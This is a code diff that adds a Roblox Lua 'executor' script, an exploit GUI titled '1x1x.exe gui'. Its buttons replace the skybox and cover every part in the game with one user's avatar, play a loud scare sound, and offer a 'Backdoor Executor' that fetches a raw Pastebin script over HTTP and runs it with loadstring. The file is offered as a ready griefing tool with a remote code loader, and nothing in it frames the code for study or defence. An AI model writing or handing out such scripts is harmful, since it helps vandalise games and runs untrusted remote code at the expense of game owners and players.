@@ -1,0 +1,148 @@
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local GUI_WIDTH, GUI_HEIGHT = 450, 400
+local TITLE_HEIGHT = 40
+local BUTTON_HEIGHT, BUTTON_PADDING = 50, 10
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GreenerExecutor"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, GUI_WIDTH, 0, GUI_HEIGHT)
+mainFrame.Position = UDim2.new(0.5, -GUI_WIDTH/2, 0.5, -GUI_HEIGHT/2)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, TITLE_HEIGHT)
+titleBar.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -40, 1, 0)
+titleLabel.Position = UDim2.new(0, 10, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "1x1x.exe gui"
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 22
+titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+titleLabel.Parent = titleBar
+
+local minBtn = Instance.new("TextButton")
+minBtn.Size = UDim2.new(0, 35, 1, 0)
+minBtn.Position = UDim2.new(1, -35, 0, 0)
+minBtn.Text = "-"
+minBtn.Font = Enum.Font.GothamBold
+minBtn.TextSize = 24
+minBtn.TextColor3 = Color3.fromRGB(0,0,0)
+minBtn.BackgroundColor3 = Color3.fromRGB(0, 220, 0)
+minBtn.BorderSizePixel = 0
+minBtn.Parent = titleBar
+
+local buttonFrame = Instance.new("ScrollingFrame")
+buttonFrame.Size = UDim2.new(1, -20, 1, -TITLE_HEIGHT - 10)
+buttonFrame.Position = UDim2.new(0, 10, 0, TITLE_HEIGHT + 5)
+buttonFrame.BackgroundTransparency = 1
+buttonFrame.CanvasSize = UDim2.new(0,0,0,0)
+buttonFrame.ScrollBarThickness = 8
+buttonFrame.Parent = mainFrame
+
+local UIGridLayout = Instance.new("UIGridLayout")
+UIGridLayout.FillDirection = Enum.FillDirection.Horizontal
+UIGridLayout.CellSize = UDim2.new(0, 200, 0, BUTTON_HEIGHT)
+UIGridLayout.CellPadding = UDim2.new(0, BUTTON_PADDING, 0, BUTTON_PADDING)
+UIGridLayout.Parent = buttonFrame
+
+local pages = {
+    {"Set Skybox", function()
+        local USER_ID = 1768406265
+        local AVATAR = "https://www.roblox.com/headshot-thumbnail/image?userId="..USER_ID.."&width=420&height=420&format=png"
+        local s = Instance.new("Sky")
+        s.Parent = game.Lighting
+        for _, v in ipairs({"Bk","Ft","Lf","Rt","Up","Dn"}) do
+            s["Skybox"..v] = AVATAR
+        end
+    end},
+    {"Decal Spam", function()
+        local USER_ID = 1768406265
+        local AVATAR = "https://www.roblox.com/headshot-thumbnail/image?userId="..USER_ID.."&width=420&height=420&format=png"
+        for _, v in workspace:GetDescendants() do
+            if v:IsA("BasePart") then
+                for _, f in Enum.NormalId:GetEnumItems() do
+                    local d = Instance.new("Decal")
+                    d.Face = f
+                    d.Texture = AVATAR
+                    d.Parent = v
+                end
+            end
+        end
+    end},
+    {"Scary Laugh", function()
+        local s = Instance.new("Sound", workspace)
+        s.SoundId = "rbxassetid://6821054463"
+        s.Volume = 5
+        s:Play()
+    end},
+    {"Backdoor Executor", function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Nc98CTFY", true))()
+    end}
+}
+
+for _, data in ipairs(pages) do
+    local btn = Instance.new("TextButton")
+    btn.Text = data[1]
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 22
+    btn.TextColor3 = Color3.fromRGB(0,0,0)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    btn.BorderSizePixel = 0
+    btn.Parent = buttonFrame
+
+    local glow = Instance.new("UIStroke")
+    glow.Color = Color3.fromRGB(0,255,0)
+    glow.Thickness = 2
+    glow.Parent = btn
+
+    btn.MouseButton1Click:Connect(data[2])
+end
+
+buttonFrame.CanvasSize = UDim2.new(0,0,0, math.ceil(#pages / 2) * (BUTTON_HEIGHT + BUTTON_PADDING))
+
+local dragging, dragStart, startPos = false
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+local minimized = false
+minBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    buttonFrame.Visible = not minimized
+    mainFrame.BackgroundTransparency = minimized and 0.85 or 0
+    minBtn.Text = minimized and "◻" or "-"
+end)
